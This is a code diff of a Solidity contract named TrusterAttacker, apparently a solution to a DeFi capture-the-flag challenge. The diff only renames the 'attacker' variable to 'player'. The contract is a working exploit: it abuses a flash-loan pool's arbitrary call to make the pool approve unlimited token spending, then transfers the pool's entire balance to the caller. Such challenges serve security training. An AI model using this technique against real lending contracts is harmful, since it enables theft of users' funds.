@@ -13,14 +13,14 @@ interface IPool{
 
 contract TrusterAttacker{
 
-    IPool public pool;
+    IPool public pool; 
     IERC20 public token;
-    address public attacker;
+    address public player;
 
     constructor(address payable _address, address _tokenAddress){
         pool = IPool(_address);
         token = IERC20(_tokenAddress);
-        attacker = msg.sender;
+        player = msg.sender;
     }
 
 function attack() external{
@@ -29,7 +29,7 @@ function attack() external{
     bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256-1);
     pool.flashLoan(0, address(this), address(token), data);
     uint amount = token.balanceOf(address(pool));
-    token.transferFrom(address(pool), attacker, amount);
+    token.transferFrom(address(pool), player, amount);
     
 
 }
